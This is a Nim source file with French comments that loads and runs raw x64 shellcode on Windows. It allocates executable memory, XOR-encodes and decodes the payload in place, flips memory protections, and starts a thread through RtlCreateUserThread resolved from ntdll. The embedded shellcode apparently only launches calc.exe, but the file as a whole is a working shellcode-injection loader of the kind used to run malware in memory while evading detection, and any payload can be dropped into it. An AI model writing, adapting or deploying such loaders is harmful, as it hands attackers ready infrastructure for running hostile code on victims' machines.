import winim/lean

proc xorEncryptDecrypt(data: var openArray[byte], key: byte) =
    for i in 0..<data.len:
        data[i] = data[i] xor key

# Allocation de mémoire avec VirtualAlloc
var pMemory = VirtualAlloc(
    NULL,                      # Adresse de base (NULL pour laisser Windows choisir)
    1024,                      # Taille en bytes
    MEM_COMMIT or MEM_RESERVE, # Type d'allocation
    PAGE_EXECUTE_READWRITE     # Protection
)


# Affichage de l'adresse retournée
echo "Adresse mémoire allouée cast int : 0x", cast[int](pMemory)
echo "Adresse mémoire allouée repr: 0x", pMemory.repr

var shellcode: array[276, byte] = [
    byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
    0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
    0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
    0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
    0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
    0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
    0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
    0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
    0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
    0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
    0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
    0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
    0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
    0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
    0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
    0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
    0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
    0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,
    0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
    0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
    0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
    0x00
]

# Clé de chiffrement
const XOR_KEY: byte = 0x41

# Chiffrer le shellcode
echo "Chiffrement du shellcode..."
xorEncryptDecrypt(shellcode, XOR_KEY)

# Copier le shellcode dans la mémoire allouée
copyMem(pMemory, addr shellcode[0], sizeof(shellcode))

# Déchiffrer le shellcode en mémoire
var oldProtect: DWORD
VirtualProtect(pMemory, sizeof(shellcode), PAGE_READWRITE, addr oldProtect)
var decryptedShellcode = cast[ptr array[276, byte]](pMemory)
xorEncryptDecrypt(decryptedShellcode[], XOR_KEY)
VirtualProtect(pMemory, sizeof(shellcode), PAGE_EXECUTE_READ, addr oldProtect)

# Déclaration du type pour RtlCreateUserThread
type
  PRTLCREATEUSERTHREAD = proc(
    ProcessHandle: HANDLE,
    SecurityDescriptor: PSECURITY_DESCRIPTOR,
    CreateSuspended: BOOLEAN,
    StackZeroBits: ULONG,
    StackReserved: PSIZE_T,
    StackCommit: PSIZE_T,
    StartAddress: PVOID,
    StartParameter: PVOID,
    ThreadHandle: PHANDLE,
    ClientId: PCLIENT_ID
  ): NTSTATUS {.stdcall.}

# Charger ntdll.dll
let ntdll = LoadLibraryA("ntdll.dll")
let RtlCreateUserThread = cast[PRTLCREATEUSERTHREAD](GetProcAddress(ntdll, "RtlCreateUserThread"))

var threadHandle: HANDLE
var clientId: CLIENT_ID

# Création du thread avec RtlCreateUserThread
let status = RtlCreateUserThread(
    GetCurrentProcess(),   # Process handle
    NULL,                 # Security descriptor
    FALSE,               # Create suspended
    0,                   # Stack zero bits
    NULL,                # Stack reserved
    NULL,                # Stack commit
    pMemory,             # Start address
    NULL,                # Parameter
    addr threadHandle,    # Thread handle
    addr clientId        # Client ID
)

if NT_SUCCESS(status):
    echo "Thread créé avec ID: ", clientId.UniqueThread
    discard WaitForSingleObject(threadHandle, 10000)
    CloseHandle(threadHandle)
else:
    echo "Erreur lors de la création du thread: ", status

echo "Appuyez sur Entrée pour terminer..."
discard readLine(stdin)